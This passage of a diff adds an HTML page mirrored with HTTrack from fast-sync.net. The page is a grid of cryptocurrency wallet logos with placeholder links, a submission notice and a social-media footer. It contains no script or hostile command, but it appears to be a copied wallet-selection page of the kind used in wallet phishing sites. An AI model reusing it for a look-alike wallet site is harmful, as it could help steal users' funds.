+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">BitKeep</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/b642ab6de0fe5c7d1e4a2b2821c9c807a81d0f6fd42ee3a75e513ea16e91151c.jpg" alt="Vision">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Vision</div>
+                            </div>
+                        </a>
+                        <a>
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/38ee551a01e3c5af9d8a9715768861e4d642e2381a62245083f96672b5646c6b.jpg" alt="PEAKDEFI Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">PEAKDEFI Wallet</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/7e90b95230bc462869bbb59f952273d89841e1c76bcc5319898e08c9f34bd4cd.jpg" alt="Unstoppable Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Unstoppable Wallet</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/025247d02e1972362982f04c96c78e7c02c4b68a9ac2107c26fe2ebb85c317c0.jpg" alt="HaloDeFi Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">HaloDeFi Wallet</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/d12b6e114af8c47a6eec19a576f1022032a5ee4f8cafee612049f4796c803c7e.jpg" alt="Dok Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Dok Wallet</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/3d56ed42374504f1bb2ba368094269eaea461c075ab796d504f354baac213dc5.jpg" alt="AT.Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">AT.Wallet</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/1e04cf5cddcd84edb1370b12eae1fcecedf125b77209fff80e7ef2a6d3c74719.jpg" alt="Midas Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Midas Wallet</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/15d1d97de89526a3c259a235304a7c510c40cda3331f0f8433da860ecc528bef.jpg" alt="Ellipal">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Ellipal</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/0fa0f603076de79bbac9a4d47770186de8913da63c8a4070c500a783cddbd1e3.jpg" alt="KEYRING PRO">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">KEYRING PRO</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c.jpg" alt="Aktionariat">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Aktionariat</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/95501c1a07c8eb575cb28c753ab9044259546ebcefcd3645461086e49b671f5c.jpg" alt="Talken Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Talken Wallet</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/78640a74036794a5b7f8ea501887c168232723696db4231f54abd3fe524037b4.jpg" alt="XinFin XDC Network">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">XinFin XDC Network</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/d612ddb7326d7d64428d035971b82247322a4ffcf126027560502eff4c02bd1c.jpg" alt="Flare Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Flare Wallet</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/55e5b479c9f49ddac5445c24725857f19888da1ef432ae5e4e01f8054d107670.jpg" alt="KyberSwap">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">KyberSwap</div>
+                            </div>
+                        </a>
+                        <a>
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/6193353e17504afc4bb982ee743ab970cd5cf842a35ecc9b7de61c150cf291e0.jpg" alt="AToken Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">AToken Wallet</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/4e6af4201658b52daad51a279bb363a08b3927e74c0f27abeca3b0110bddf0a9.jpg" alt="Tongue Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Tongue Wallet</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/b13fcc7e3500a4580c9a5341ed64c49c17d7f864497881048eb160c089be5346.jpg" alt="RWallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">RWallet</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/13c6a06b733edf51784f669f508826b2ab0dc80122a8b5d25d84b17d94bbdf70.jpg" alt="PlasmaPay">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">PlasmaPay</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/0aafbedfb8eb56dae59ecc37c9a5388509cf9c082635e3f752581cc7128a17c0.jpg" alt="O3Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">O3Wallet</div>
+                            </div>
+                        </a>
+                        <a>
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/761d3d98fd77bdb06e6c90092ee7071c6001e93401d05dcf2b007c1a6c9c222c.jpg" alt="HashKey Me">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">HashKey Me</div>
+                            </div>
+                        </a>
+                        <a>
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/0a00cbe128dddd6e096ebb78533a2c16ed409152a377c1f61a6a5ea643a2d950.jpg" alt="Jade Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Jade Wallet</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/c04ae532094873c054a6c9339746c39c9ba5839c4d5bb2a1d9db51f9e5e77266.jpg" alt="Guarda Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Guarda Wallet</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/ffa139f74d1c8ebbb748cf0166f92d886e8c81b521c2193aa940e00626f4e215.jpg" alt="Defiant">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Defiant</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/1ce6dae0fea7114846382391d946784d95d9032460a857bb23b55bd9807259d1.jpg" alt="Trustee Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Trustee Wallet</div>
+                            </div>
+                        </a>
+                        
+                    </div>
+                </div>
+                <div class="mt-10"></div>
+                <div class="text-gray-500">
+                    <p>
+                        Open an app submission issue on
+                        <a class="font-semibold text-blue-500 hover:text-cool-blue-600" href="#">
+                            <!-- -->
+                            GitHub<!-- -->
+                        </a>
+                        to add your wallet here.
+                    </p>
+                </div>
+            </main>
+
+
+ <footer class="flex justify-center mt-24 mb-16 sm:mt-32">
+                <div class="flex flex-col space-y-6 sm:space-y-0 sm:space-x-20 sm:flex-row">
+                    <a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank" href="#" rel="noopener noreferrer">
+                        <div class="flex">
+                            <img class="w-6 sm:w-8" src="logo/discord.svg" alt="Discord">
+                            <p class="ml-2">Discord</p>
+                        </div>
+                    </a>
+                    <a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank" href="#" rel="noopener noreferrer">
+                        <div class="flex">
+                            <img class="w-6 sm:w-8" src="logo/twitter.svg" alt="Twitter">
+                            <p class="ml-2">Twitter</p>
+                        </div>
+                    </a>
+                    <a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank" href="#" rel="noopener noreferrer">
+                        <div class="flex">
+                            <img class="w-6 sm:w-8" src="logo/github.svg" alt="GitHub">
+                            <p class="ml-2">GitHub</p>
+                        </div>
+                    </a>
+                    <a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank" href="support.html" rel="noopener noreferrer">
+                        <div class="flex">
+                            <img class="w-6 sm:w-8" src="logo/mail.svg" alt="Support">
+                            <p class="ml-2">Support</p>
+                        </div>
+                    </a>
+                </div>
+            </footer>
+        </div>
+    </div>
+    
+</body>
+
+<!-- Mirrored from fast-sync.net/wallet/wallet.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 16 Oct 2021 14:36:54 GMT -->
+</html>
+
